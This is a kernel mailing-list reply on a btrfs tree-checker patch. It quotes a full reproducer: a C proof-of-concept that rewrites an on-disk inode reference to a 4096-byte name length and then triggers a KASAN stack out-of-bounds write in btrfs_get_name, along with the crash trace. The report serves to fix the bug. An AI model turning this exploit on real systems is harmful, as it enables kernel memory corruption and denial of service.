Received: from mout.gmx.net (mout.gmx.net [212.227.17.20])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 0F7CF25B0B9
	for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 11:26:24 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=212.227.17.20
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781090787; cv=none; b=jC3FmmF8LUdQmp5cMgI4z2C5L54hn5eKW3siz/XnPhu3LQf/WQv7RMBaOGqxmtyf+Ggzagba+j/u8sEZzRayoHXlbfo+WaRhf9fVYo7datqt5SLdVNfsLD1WdQZXDrUx5351OITF9683I3td5f5mCw1jbSGQwoH9Xllw20Odsow=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781090787; c=relaxed/simple;
	bh=FBW7C/J/Pvf4R653v0pz/P+2ZUc5P4QvdhQxHk5XKI4=;
	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
	 In-Reply-To:Content-Type; b=SOuNYbJe+4lfjn/SyJTz7viYOXVS6lKLgWrATe2/um5ITHvlg1LWaquyBHCmnvJD+qhzOkGTmpUl1ccpcIbhEiYYFgVgcITNGcBG9q0ZIn2Ck/PJzK2G6k7BZzKs49AS+tQXU0NKToyaTUFE2J25SMd/seErHC0xACthJNyfbBI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=gmx.com; spf=pass smtp.mailfrom=gmx.com; dkim=pass (2048-bit key) header.d=gmx.com header.i=quwenruo.btrfs@gmx.com header.b=FiTyh8Av; arc=none smtp.client-ip=212.227.17.20
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=gmx.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmx.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmx.com header.i=quwenruo.btrfs@gmx.com header.b="FiTyh8Av"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmx.com;
	s=s31663417; t=1781090775; x=1781695575; i=quwenruo.btrfs@gmx.com;
	bh=eTF/kbmojVnL3BEZ6YoOWqQcJpze3HqKF05/IbfUqQQ=;
	h=X-UI-Sender-Class:Message-ID:Date:MIME-Version:Subject:To:Cc:
	 References:From:In-Reply-To:Content-Type:
	 Content-Transfer-Encoding:cc:content-transfer-encoding:
	 content-type:date:from:message-id:mime-version:reply-to:subject:
	 to;
	b=FiTyh8AvsbQZGMPwaXydgN111sbmWEroB1PQ38DuFzUmPSBLoIwgWM1ZiQb3r1lx
	 Czi4mK5OpBxiuoNS4A4BZAfcrRvGR7eiooD9lHkb2jvckp/QGQ5BTFnkTTh7jVoNc
	 i2lLzVALlacveOcpFvtGCYlb/CmpM2RE1izWZ1RkP8pc6ycnjDENM9RZm9TJqP9o7
	 fLHuTUnGjBTrnERUkpQcJ0vDU1B7g201qLmwTLhP4yiA3EHumFC5Sa/0w2fghQp08
	 fPd2lxkkFajx92BhskS71830ms75yV920Cjb/UwjXHgYTYsSW1zIpzWxK4fLzLwKo
	 R7YAJy6BtRiTVYrTmA==
X-UI-Sender-Class: 724b4f7f-cbec-4199-ad4e-598c01a50d3a
Received: from client.hidden.invalid by mail.gmx.net (mrgmx104
 [212.227.17.174]) with ESMTPSA (Nemesis) id 1MF3DM-1wQiZK3PvU-007MVF; Wed, 10
 Jun 2026 13:26:15 +0200
Message-ID: <9633f128-a74b-4d72-a06e-b8cf694545ee@gmx.com>
Date: Wed, 10 Jun 2026 20:56:10 +0930
Precedence: bulk
X-Mailing-List: linux-btrfs@vger.kernel.org
List-Id: <linux-btrfs.vger.kernel.org>
List-Subscribe: <mailto:linux-btrfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-btrfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Subject: Re: [PATCH v2] btrfs: tree-checker: validate inode_ref and root_ref
 name lengths
To: Weiming Shi <bestswngs@gmail.com>, linux-btrfs@vger.kernel.org
Cc: dsterba@suse.com, josef@toxicpanda.com, clm@fb.com, xmei5@asu.edu
References: <20260608083509.3907960-2-bestswngs@gmail.com>
 <aik0hEV6ehKx6Ldv@Air.local>
Content-Language: en-US
From: Qu Wenruo <quwenruo.btrfs@gmx.com>
Autocrypt: addr=quwenruo.btrfs@gmx.com; keydata=
 xsBNBFnVga8BCACyhFP3ExcTIuB73jDIBA/vSoYcTyysFQzPvez64TUSCv1SgXEByR7fju3o
 8RfaWuHCnkkea5luuTZMqfgTXrun2dqNVYDNOV6RIVrc4YuG20yhC1epnV55fJCThqij0MRL
 1NxPKXIlEdHvN0Kov3CtWA+R1iNN0RCeVun7rmOrrjBK573aWC5sgP7YsBOLK79H3tmUtz6b
 9Imuj0ZyEsa76Xg9PX9Hn2myKj1hfWGS+5og9Va4hrwQC8ipjXik6NKR5GDV+hOZkktU81G5
 gkQtGB9jOAYRs86QG/b7PtIlbd3+pppT0gaS+wvwMs8cuNG+Pu6KO1oC4jgdseFLu7NpABEB
 AAHNIlF1IFdlbnJ1byA8cXV3ZW5ydW8uYnRyZnNAZ214LmNvbT7CwJQEEwEIAD4CGwMFCwkI
 BwIGFQgJCgsCBBYCAwECHgECF4AWIQQt33LlpaVbqJ2qQuHCPZHzoSX+qAUCZxF1YAUJEP5a
 sQAKCRDCPZHzoSX+qF+mB/9gXu9C3BV0omDZBDWevJHxpWpOwQ8DxZEbk9b9LcrQlWdhFhyn
 xi+l5lRziV9ZGyYXp7N35a9t7GQJndMCFUWYoEa+1NCuxDs6bslfrCaGEGG/+wd6oIPb85xo
 naxnQ+SQtYLUFbU77WkUPaaIU8hH2BAfn9ZSDX9lIxheQE8ZYGGmo4wYpnN7/hSXALD7+oun
 tZljjGNT1o+/B8WVZtw/YZuCuHgZeaFdhcV2jsz7+iGb+LsqzHuznrXqbyUQgQT9kn8ZYFNW
 7tf+LNxXuwedzRag4fxtR+5GVvJ41Oh/eygp8VqiMAtnFYaSlb9sjia1Mh+m+OBFeuXjgGlG
 VvQFzsBNBFnVga8BCACqU+th4Esy/c8BnvliFAjAfpzhI1wH76FD1MJPmAhA3DnX5JDORcga
 CbPEwhLj1xlwTgpeT+QfDmGJ5B5BlrrQFZVE1fChEjiJvyiSAO4yQPkrPVYTI7Xj34FnscPj
 /IrRUUka68MlHxPtFnAHr25VIuOS41lmYKYNwPNLRz9Ik6DmeTG3WJO2BQRNvXA0pXrJH1fN
 GSsRb+pKEKHKtL1803x71zQxCwLh+zLP1iXHVM5j8gX9zqupigQR/Cel2XPS44zWcDW8r7B0
 q1eW4Jrv0x19p4P923voqn+joIAostyNTUjCeSrUdKth9jcdlam9X2DziA/DHDFfS5eq4fEv
 ABEBAAHCwHwEGAEIACYCGwwWIQQt33LlpaVbqJ2qQuHCPZHzoSX+qAUCZxF1gQUJEP5a0gAK
 CRDCPZHzoSX+qHGpB/kB8A7M7KGL5qzat+jBRoLwB0Y3Zax0QWuANVdZM3eJDlKJKJ4HKzjo
 B2Pcn4JXL2apSan2uJftaMbNQbwotvabLXkE7cPpnppnBq7iovmBw++/d8zQjLQLWInQ5kNq
 Vmi36kmq8o5c0f97QVjMryHlmSlEZ2Wwc1kURAe4lsRG2dNeAd4CAqmTw0cMIrR6R/Dpt3ma
 +8oGXJOmwWuDFKNV4G2XLKcghqrtcRf2zAGNogg3KulCykHHripG3kPKsb7fYVcSQtlt5R6v
 HZStaZBzw4PcDiaAF3pPDBd+0fIKS6BlpeNRSFG94RYrt84Qw77JWDOAZsyNfEIEE0J6LSR/
In-Reply-To: <aik0hEV6ehKx6Ldv@Air.local>
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: quoted-printable
X-Provags-ID: V03:K1:H+XnD28q6aC9SvMeaYFO18FYkeO27YGSyDHEkYMUGwjZD3pwabH
 SmOcNuV07s06ZOjJ2NdLIw6U3nNDBxl7d6Y549jkA7NrQj1GxYugQCd+Msdn3EuzWranLUD
 iWWeLkKxAKEOp0wrt6BIG8Ubstbo9KthB7F/JA/1uWdj6Njg/2h+xHVN2bBHBn60ymnjV+E
 ddTF96Gjv4hWvP6ZpxAwA==
X-Spam-Flag: NO
UI-OutboundReport: notjunk:1;M01:P0:vJ687Inr1iI=;lgZ7QU85nCjYn+pXI9sQiSCPKch
 eT3FscufdmNcqUfkhckHvQAzyMUnvzhtd/YW45fIbFxtKkQfmtTJbqBORO98RIH4r+cHAS3QD
 IANgn6O2Z/L71x2u9CBCucZHiKGnMGfZxOH/fYbSrJLDXOUhfdgx0I5UNKmJwyCRhW3iCi3Tl
 Ht/DuIXt/Vjus9NqucJjrM+NF8LRcZtjmNrXwQ/07D0s/e7Urr9uS1twCnu4aNE3pp1J6rLDb
 CO17DDJ35D/h/YsktBeqL8J+4GpLRwolLI1ajAX7DITk/4nvCZEKGOYVRQKCUsikZD5bOaANG
 g821lvuS1ZjW6WGzvXpyZ3Db1WEgCsbyq4ZMJuWZDfLPmtqM6X8sqTVCxecP7p9FXYhOy8oak
 8XwSbA4P/b2dHJWrQMIg+dsI0I0Atm1siHDZtgeBRuZCtW7nCZH1QiAGjRmimsNoy3Eeiwkmh
 9x8qCwGHptAa9Bvx1u6D2w3mGfX0Fk91f3O/wCh5pq76HfDbHhpGjhQhJ3k+ZGb0R7yhGvOqh
 UzeikmdNBmjXq9RuA40g8wEop9FAXwcwWAN8VwM1U8fsa3zfIWQNOUiHytrrBDbG+40BFEXSt
 5GlXsJN41AhO6/QtOn0MrDCHe3fHPX9sEu7/DW1t7cGNEXJihDXY9rGtAJjerSQa036JBmKBo
 Tn1xGpTWF+MrgKEh35cJLvEr62GXabfIiY07yut97Dco62udOldHmWUSpzpEuQng5NyeQFpiB
 ZbgiYlQhSQx+BtrsI0HJe4Ao/M8yVAF1gE5CFIE6ndyaPWFkl9zPSrl/WfB54W24cXwZ+rVh3
 ZEAKtCGY8OPkNeKnHnZVpPN5muZQoV0D246OkOG5PsLbp1SBl/ti2Sb3cp0h3Wltr1s8QJKeO
 e7cLZfcI9f1OWGeOAS+HZCYGxAlgmBCvUyPcxU9nVcX5CL8gytVeLdC5GpcA08uJcNkE+eI2U
 gFGZcTQWc/MfhDZ7aGbkDC6ilT6EgQkEEJIRQ2ezkWxJ8e6NKHWxP3HXZE195A2K/4jBebCQi
 F3VLzAgzgVJLG9JvxJF91RD88OasVrgihM9/C+pWmhyRgk6zbAbexM+KFCbQvKAnbDHfUBgay
 ZySXWFfWxpUue2zbuk+PYePOMG/mZOPmjk4nfAAF8gl2XCdz5OFC4nXFFVy0Inl1ZwDqAfh8R
 1PPF0yG0i73XDRtjdZWH/FakLuaIkcaLKY0ZzTd5v5BaIwp5eo9xd+kq7L3qOYC1mv8jXAam/
 KqXmca8KP2gCxYUQl9SGDnGk04HeIlJDIi4KZcHT9nVFp0bTphAJ85x+3AzjYyCzLF5a4jrKk
 sTfWKlKiZUPD7DmffQk2LWsdLs3sNASeyYehISl7isbH6bR8V4G+NI6hAMKZ/fxanWRzgFx1n
 BjxvGEbTMeB/jAA/2wSPkaWP3cvxHgxwuOZ5J+N+humA8OCtG/M843B+cDcDvz6b4mZ4sSsMx
 PWYBXIOYm8vdXsfmfGhGflRMS2zPqdNqBxCv+ot2R18Wf6yhNEEaMQSKhdfk6jLVFOydJwj3O
 A56aFamYM914ds7fpcJIYS50N2pCAEtj0HtT5ljrpNv6aKLWn0NRGjwN2oiV4HsBZUoJ8JqxH
 FF0aN0kwtwOtzaBica0uNsrp7mBgLwDKA8lZb8bVF7RhNEhCapK7WL0yf6a0VQFzG6ZMx9x5M
 F2ISKREb44qRwRlE6uSLKcRYiN5KEqOqcRCPq19onDubbInUlAUw6epq+O+9Uxg8df/OWcM62
 cJcV7ntZs7iwHwR0jvXb50Mj1y+11L/TMHnvOG7QdWc6r+trikaVInx08T8ecypTXZP7L1aya
 poyQCd6PvoAXAqbz7SgG6ri0LWDagb//5nYfPLUDXENxajoS6s2k2iGVXMyCFBw2M6ghrlU1p
 Ca08FoylPGkcsnXpqm8OKdazqn0qHenmMGg9ncOtYyTJLBZKNJ3SSlujM9X3lRe+mOjCnuOhs
 uJ230HJABJqlk6ZgMaIWfxBKU3f0U76XBcYpECa5/iCnKP5lC/o5b30ROZQShEANh2PPlDG9l
 WhcF7Vd97ta9DIavzTMKVyLHYfTfb7QM96U66QYAB08Wu5Ypfjvs6xTci91rBBXnE3PLeNnvS
 RXQe0GgepQO+z7ymrHmyezM1U6Ixfw0dPX3DRhSJADlxvx1zXaLs+iMOw1W/PtXO3IW00xXGq
 DrjUs8m9Nh/TNx0acTgoeRYMkygwxMMgXgAU52EY3tD5yA421MmPzbQisBj54Wdl1ukRDsv/i
 yHVCZ2/4R0MFHE2/tSgsDbPJoeV2I/MAItcTONoiGHrqUUqwgj2YPK2FOo7CMeq65icIxYT6Y
 TxKg7jNjIXpu6CWOugKI5nMuLHIjaJYHiLppmpEJScQfShYhDqL8MQVQUEyKa9Zo/jyF9BwlJ
 wV5HgCR+3BQnjZJWvswmv3LZvnrPLHWtVYNpfIlCRdqEbU3eHHlco/zA2qD42+tKnR22SX6Vl
 AL1+RPPYl7EXXec2uWBgRsRB+nOjWo6v5bxK8pz/VSMV7KEv1sZ0cEwPxaOPF6akE/xehApkw
 B1MNk4zkUbYfv4d0n9o0Va+jpS/nf/b0B8eJv4ovbVuewasu1BTjbEdaIg4KOUQHbs/v20aam
 tTgZ3jQr5J9FH8MLsQfGvEalLnnbDgNgjw5v06Jsg7vrvwanZeQo1pA9EYvf/cB7abTb1syyj
 /OqsDBHT+G0cm0HOrA1P2SxCgLXlf4ifzun6R46r+2U0ZoDPgATYfThq/zZvIGpaYF4uwKeJP
 VpapQceH7uCsl6TsHOeIEhJhqGphkMPNcXEsoFOLebZ4atvtJ5QhlFOXd2pW4nP/zg9F3Qf3Y
 50VwJ+maGuVKa5LfWKeUr6p8lX4L/wkIl9D+Aw++/NhNAAehRw4xGp8T0/lBtNG0R3BGc7cbp
 GCAZJfgKCaNwJ3TOcnp8fBTCgiFMrTzNTmOa+8v5JAWcgung3kelg2cGoGW7py6lDquxmlV8W
 P/52QxXT4DpbkVld3CE827PYaqwd8jOVHNcBJrqXfcTO4FEjnwx/hJh/suTFoFHK804D6QPkF
 4iUDQxy+tokCs3sx5Q9xfeluKQ2QDZB45prxghmKp8qyAVDdZsmuVkygmgGafKFb+xBUYtMwL
 U1BfY7Kyo5AfWQgIl/w22H7mf4BV9coYkKwGc0a8ebA8JAPB2NIIX0L0smYjo4u9OWvsKjyfb
 fwqQ844c121ve/D8tdanvPU2H4/UV8eUVufGzT9dwgmpDLAvBhpxBdSL2Wgt17/5IRuTQmkSU
 YtLAet9aDb2TGiaMbiUhmslDAOZFvJSk6btRJE3R/SsCdXw41yQrAXYVzVAb50psHvvJbFFAT
 AUHAZCxaTDgb+ENjBvkPFXvBi4B+59EvVW9uxJ07i4MPd6VH2XRt2O2Xc+tm1EWv5dw6fk1nN
 IM7a/UrsDuX4CTpW5kwUxwF6dk1zMiU3KUTgrKkLacmFYVPfkLOyuZXiNVM4ujVtIS7dWVzYn
 CdwtZdo4CTH7MJSj26ogAVYETJfFyvZ9uewrewPJXCL7tj85nolXGeebVrfY2OTSHTNf1mNSJ
 L15fHupxdWN2WUI8Y+miPIsnkg1eHJOH3DaXFVnAm1lCtx91C4mYlwXQu7Cid3DhQAhkBHsLT
 a25qFhI8yVeXjcldRRhSvYzDvG0e4UffJNNnFMStW/1wnBAKFkqfpA0K9/dlqGh82Z0i1tAsX
 4G4L+uSHU98S/Y6u+Z4nCNs76YoP7d22mXDDDymydwz450CW69MLXISq3tnSKtA0lYjOvQXNg
 dzZksvzmdq8i5PXCqXqgbmDbhCX4jPDAOlLPwC2OclLCNsSjpeDpRxsIIsnQ00SB330AzEO8K
 IRmvlT4xpIUCcvdB63T7ysSRXaEFgSRbkeAVKyveyOnGIa3HnbpeC7Crk8hw2iw+r128D7zNx
 ZTvDLRw+3R1axlsQKJ0PnPCYEL0roYClGoBR7Q+DwAyfj1iPso0jLAISUfb4D7MKOvUvapeyL
 6tCmR04Ov4JqtkIgeH03C+9LfhDKTpVzK8a0IOf3ChNy99Eh+2Pi315yJVIcC9S6wZ+Z1Oa9m
 1dT72ALFngygY8YHZrf/BCnjljddNg2Rn1skkQVnPvsSCyBoXB8okst68cmG7V7YrZv/n78wf
 auWCfFSZBmjy2tqJ5b1EQb1T3wHJWmePmZC6tJV/3C1Mk2wRvV8Ks9vRzE7dbv8nqlR37u6ut
 DO7Z4HaT03i1eYK4YjLwz8nXAGSx2VEgMVG2tD70nSLf3ks48R7zLYRUgKbBPAC3ToypOyKuW
 E63bo4FgELytmg7ZK+hTwtYDEsKZ+tQG4Ug8hwLUE6uA8SPMcyYe0vIyXSwvmxapECUSj52hP
 dJzvYrffjNp0mLFpK1Wt+5JQD/wOsEH2+CEM9TVMxkSU7336G9IXNdppEqLOdVxh3cnPWBTMj
 lyi/b3IT+6Cd9Udu08G6mjLIoM4ELZIz8/qVmnWDvh4HAJSW2zs7osUfeJAYpFY+DSwfyuIsz
 HIPh+CIyAE5UhoT05MTc4zfJN56KTQderxGQQzHcwAUEwo10nbQQ4l2ZbPx+G3OteW1mHEWrZ
 oLX8qncAn2wvrSqLTExTUZqfOS/AuRkq9/Lbp6x8P6Nmg3tE3o6Kr8MZ25++aOou1253bXrUS
 U3oW3heuwx7sAAIeEEhnXFRF3ZxpOvaca4tv841Wb7ZlGX7JccDbBvwCrGOyUpXdcHO9LuRbU
 5nIbI5+a1ECU/utVx+4T2WY1NqxBHoRvUK2pKuGg6poYlyHIhUftHJVSEAeTPafXqbU7AuRgB
 uip92rqann7XgbVK4IQoffFpesMgOe2/T6KfUpQ9IEigb/qtWAQU+jqiS/N4Q+VJl32I0EP60
 SW3HtikpeTeSDBibjLhnOSwG49yLFVPhLaXmqQP4d5OfZrDomo448onSMQ/REGqL46LgExbQh
 RyvYjL7OKrXZSoHi8TfFlmxmFrMezI0NxIS8B4GXFi1yVYgiMtHCC6NOujtvZNwL0amXZXKGu
 7ML+pA+FNYr7CuVMRo5q6OtxIJNoA8VDNXqoPCK1Y2pVYOMGYIXJobSnxbWob5AAJGOhJca/W
 qmkms2UPpuIJ5VZecG2kf4G+m0/YTSFW271sbJic2PWDofjAZlhr9hICzZsWqcvRWim48uoUn
 FcIaDLfHo54qNoTncr3dSSBhYNNkW9sbX2AUTSBS3ADvmXdni7zKzygi26CAOtmGtt+k6MBDT
 y7v3TnA5epOvOXcrph9ZM68SOi8uwo2i2/qsNGt5gknNQPQH05tFxwpJw9Mka4jPIJbceNPl3
 fZoivdljevbc94cB2BH+BgemTtfVXy+lStdWj1sb97RAY3bodzgMYBqNHLLa1UzCGsMLydZpX
 qXFWb8Cr1Sv4XvY2/sCEL+UWEPSFY2sti1I19KcgoFgsgyT1mLLEMrHI7aXaFPxYb/i//MTqs
 6iwlsC5ILXOKMtHz3wbCN1JmdeXyluVBpzEKHg+ODta/nx/yQdBHTyKm4qbO5xF7PbFzm0jdD
 4m00M1Y/7Jh2uvceeCT7D8K5VbrLNax8F2WQuBLju/GrcjK/6l2g2s5BIGhGOyNRlMQn4i6aF
 Svzcxnbr5TRqzcR1FirrSlWdtysUhePQCDmBQt5D15TaQ55QkpR5/QvqLizC1Si4aMnjiw==



=E5=9C=A8 2026/6/10 20:15, Weiming Shi =E5=86=99=E9=81=93:
> Reproduction:

You should use "Link:" tag to link to this reproducer mail in your final=
=20
fix.

And you're CCed in another thread about all this.

>=20
>=20
> required kernel configuration
> ```
> CONFIG_BTRFS_FS=3Dy
> CONFIG_KASAN=3Dy
> CONFIG_KASAN_INLINE=3Dy
> ONFIG_KASAN_STACK=3Dy
> CONFIG_STACKPROTECTOR_STRONG=3Dy
> ```
>=20
> Steps to reproduce:
>=20
> 1. Create a btrfs filesystem
> ```
> #!/bin/sh
> set -e
> OUT=3D"${1:-base.img}"; SIZE=3D"${2:-512M}"
> rm -f "$OUT"; truncate -s "$SIZE" "$OUT"
> mkfs.btrfs -f "$OUT" >/dev/null
> echo "wrote clean btrfs image: $OUT ($SIZE)"
> ```
>=20
> 2. Then Run qemu with the image
> ```
> qemu-system-x86_64 -enable-kvm -cpu host -m 4G -smp 2 -nographic -no-reb=
oot \
>      -kernel kernel/test-bzImage-kasan \
>      -initrd env/initramfs-selfcontained.cpio.gz \
>      -drive file=3D/tmp/base.img,if=3Dvirtio,format=3Draw,snapshot=3Don =
\
>      -append "console=3DttyS0 rdinit=3D/init nokaslr kasan.fault=3Dpanic=
"
> ```
>=20
>=20
> 3. run the PoC
>=20
> ```c
> // Build:  gcc -O2 -static -o poc poc_selfcontained.c
> // Run  :  attach a freshly `mkfs.btrfs`-ed image as DEV (default /dev/v=
da)
>=20
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <stdint.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <sys/mount.h>
> #include <sys/stat.h>
> #include <sys/mman.h>
>=20
> #ifndef DEV
> #define DEV "/dev/vda"
> #endif
> #define MNT "/mnt"
>=20
> #define HDR             0x65    // sizeof(struct btrfs_header)
> #define ITEM            25      // sizeof(struct btrfs_item)
> #define IREF            10      // sizeof(struct btrfs_inode_ref): u64 i=
ndex + u16 name_len
> #define SECTOR          4096
> #define KEY_INODE_REF   12      // BTRFS_INODE_REF_KEY
> #define TARGET_NAME_LEN 4096
>=20
> static uint32_t crc32c(const uint8_t *p, size_t n)
> {
> 	uint32_t crc =3D ~0u;
> 	for (size_t i =3D 0; i < n; i++) {
> 		crc ^=3D p[i];
> 		for (int k =3D 0; k < 8; k++)
> 			crc =3D (crc >> 1) ^ (0x82F63B78u & (-(int32_t)(crc & 1)));
> 	}
> 	return ~crc;
> }
> static uint64_t rd64(const uint8_t *p){ uint64_t v; memcpy(&v,p,8); retu=
rn v; }
> static uint32_t rd32(const uint8_t *p){ uint32_t v; memcpy(&v,p,4); retu=
rn v; }
> static void     wr32(uint8_t *p, uint32_t v){ memcpy(p,&v,4); }
> static void     wr16(uint8_t *p, uint16_t v){ memcpy(p,&v,2); }
>=20
> struct fh { struct file_handle h; unsigned char buf[64]; };
>=20
> // Rewrite d's INODE_REF item on the raw device (every DUP copy of the l=
eaf).
> static int patch_device(const char *dev, uint64_t d_ino, uint64_t sub_in=
o)
> {
> 	int fd =3D open(dev, O_RDWR);
> 	if (fd < 0) { perror("open dev"); return -1; }
> 	off_t sz =3D lseek(fd, 0, SEEK_END);
> 	uint8_t *m =3D mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
> 	if (m =3D=3D MAP_FAILED) { perror("mmap"); close(fd); return -1; }
>=20
> 	// superblock @ 64K: magic@+0x40, fsid@+0x20, nodesize@+0x94
> 	const uint8_t *sb =3D m + 0x10000;
> 	if (memcmp(sb + 0x40, "_BHRfS_M", 8)) { fprintf(stderr,"bad btrfs magic=
\n"); return -1; }
> 	uint8_t fsid[16]; memcpy(fsid, sb + 0x20, 16);
> 	uint32_t nodesize =3D rd32(sb + 0x94);
>=20
> 	int patched =3D 0;
> 	for (off_t off =3D 0; off + (off_t)nodesize <=3D sz; off +=3D SECTOR) {
> 		if (memcmp(m + off + 0x20, fsid, 16)) continue;   // same filesystem
> 		if (m[off + 0x64] !=3D 0) continue;                 // leaf (level 0)
> 		uint32_t nritems =3D rd32(m + off + 0x60);
> 		if (!nritems || nritems > 2000) continue;
>=20
> 		for (uint32_t i =3D 0; i < nritems; i++) {
> 			off_t ip =3D off + HDR + (off_t)i * ITEM;
> 			if (rd64(m+ip) !=3D d_ino || m[ip+8] !=3D KEY_INODE_REF ||
> 			    rd64(m+ip+9) !=3D sub_ino)
> 				continue;
> 			uint32_t ioff =3D rd32(m+ip+17), isize =3D rd32(m+ip+21);
> 			if (isize !=3D IREF + 1) continue;              // expect the "d" ent=
ry (len 1)
>=20
> 			uint32_t new_size =3D IREF + TARGET_NAME_LEN;   // 4106
> 			uint32_t delta    =3D new_size - isize;         // 4095
>=20
> 			// start of the packed data region =3D lowest item data offset
> 			uint32_t data_end =3D nodesize;
> 			for (uint32_t j =3D 0; j < nritems; j++) {
> 				uint32_t o =3D rd32(m+off+HDR+(off_t)j*ITEM+17);
> 				if (o < data_end) data_end =3D o;
> 			}
> 			if (delta > data_end - ITEM*nritems) { fprintf(stderr,"no room\n"); c=
ontinue; }
>=20
> 			// grow item i: shift the data of items at offset <=3D ioff down by d=
elta
> 			uint8_t *base =3D m + off + HDR;
> 			memmove(base + data_end - delta, base + data_end,
> 				(ioff + isize) - data_end);
> 			for (uint32_t j =3D 0; j < nritems; j++) {
> 				off_t jp =3D off + HDR + (off_t)j * ITEM;
> 				uint32_t o =3D rd32(m+jp+17);
> 				if (o <=3D ioff) wr32(m+jp+17, o - delta);
> 			}
> 			wr32(m + ip + 21, new_size);                  // item size 11 -> 4106
> 			wr16(base + (ioff - delta) + 8, TARGET_NAME_LEN); // name_len 1 -> 40=
96
>=20
> 			wr32(m + off, crc32c(m + off + 0x20, nodesize - 0x20)); // leaf csum
> 			patched++;
> 			break;            // one matching item per leaf; keep scanning for DU=
P copies
> 		}
> 	}
> 	msync(m, sz, MS_SYNC);
> 	munmap(m, sz);
> 	close(fd);
> 	return patched;
> }
>=20
> int main(void)
> {
> 	struct fh fh; int mid; struct stat st;
> 	uint64_t d_ino, sub_ino;
>=20
> 	mkdir(MNT, 0755);
> 	if (mount(DEV, MNT, "btrfs", 0, NULL)) { perror("mount #1"); return 1; =
}
>=20
> 	mkdir(MNT "/sub", 0755);
> 	if (mkdir(MNT "/sub/d", 0755)) { perror("mkdir /sub/d"); return 1; }
> 	stat(MNT "/sub",   &st); sub_ino =3D st.st_ino;
> 	stat(MNT "/sub/d", &st); d_ino   =3D st.st_ino;
> 	printf("[poc] created /sub/d  (sub_ino=3D%lu d_ino=3D%lu)\n",
> 	       (unsigned long)sub_ino, (unsigned long)d_ino);
>=20
> 	fh.h.handle_bytes =3D sizeof fh.buf;
> 	if (name_to_handle_at(AT_FDCWD, MNT "/sub/d", &fh.h, &mid, 0)) {
> 		perror("name_to_handle_at"); return 1;
> 	}
> 	printf("[poc] obtained file handle for /sub/d (%u bytes)\n", fh.h.handl=
e_bytes);
> 	sync();
> 	umount(MNT);
>=20
> 	int n =3D patch_device(DEV, d_ino, sub_ino);
> 	printf("[poc] rewrote %d on-disk INODE_REF copy/ies: name_len 1 -> %d, =
"
> 	       "item 11 -> %d bytes\n", n, TARGET_NAME_LEN, IREF + TARGET_NAME_=
LEN);
> 	if (n < 1) { fprintf(stderr, "[poc] nothing patched\n"); return 1; }
>=20
> 	if (mount(DEV, MNT, "btrfs", 0, NULL)) { perror("mount #2"); return 1; =
}
> 	int mfd =3D open(MNT, O_RDONLY | O_DIRECTORY);
> 	if (mfd < 0) { perror("open mnt"); return 1; }
>=20
> 	puts("[poc] open_by_handle_at(/sub/d) -> reconnect_path -> btrfs_get_na=
me "
> 	     "(expect stack-OOB on a vulnerable kernel)");
> 	int r =3D open_by_handle_at(mfd, &fh.h, O_RDONLY | O_DIRECTORY);
> 	if (r < 0)
> 		printf("[poc] open_by_handle_at: %s  -- no crash, kernel is PATCHED\n"=
,
> 		       strerror(errno));
> 	else
> 		puts("[poc] open_by_handle_at succeeded (unexpected)");
> 	return 0;
> }
>=20
> ```
>=20
>=20
> 4. Observe the crash
>=20
> ```
> [   23.447577][  T178] BUG: KASAN: stack-out-of-bounds in read_extent_bu=
ffer+0x2b4/0x3c0
> k-OOB on a vulne[   23.447983][  T178] Write of size 633 at addr ffff888=
10a67fbc0 by task poc/178
> rable kernel)
> [   23.448358][  T178]
> [   23.448523][  T178] CPU: 1 UID: 0 PID: 178 Comm: poc Tainted: G      =
  W           7.1.0-rc2+ #166 PREEMPT(lazy)  94e7405e6ff72f9547adbe151fef1=
87ff71238a
> [   23.448527][  T178] Tainted: [W]=3DWARN
> [   23.448527][  T178] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + =
PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [   23.448529][  T178] Call Trace:
> [   23.448530][  T178]  <TASK>
> [   23.448531][  T178]  dump_stack_lvl+0x93/0x100
> [   23.448535][  T178]  print_address_description.constprop.0+0x30/0x400
> [   23.448537][  T178]  ? __virt_addr_valid+0x228/0x440
> [   23.448540][  T178]  ? read_extent_buffer+0x2b4/0x3c0
> [   23.448542][  T178]  print_report+0xc4/0x2c0
> [   23.448544][  T178]  ? __virt_addr_valid+0x237/0x440
> [   23.448546][  T178]  ? read_extent_buffer+0x2b4/0x3c0
> [   23.448548][  T178]  kasan_report+0xf8/0x140
> [   23.448550][  T178]  ? read_extent_buffer+0x2b4/0x3c0
> [   23.448553][  T178]  kasan_check_range+0x119/0x200
> [   23.448555][  T178]  __asan_memcpy+0x3c/0x80
> [   23.448558][  T178]  read_extent_buffer+0x2b4/0x3c0
> [   23.448561][  T178]  btrfs_get_name+0x333/0x600
> [   23.448564][  T178]  ? __pfx_btrfs_get_name+0x40/0x40
> [   23.448566][  T178]  ? __lock_acquire+0x4f9/0xc00
> [   23.448570][  T178]  reconnect_one+0x17e/0x580
> [   23.448572][  T178]  ? __pfx_reconnect_one+0x40/0x40
> [   23.448574][  T178]  ? trace_preempt_enable+0xac/0x180
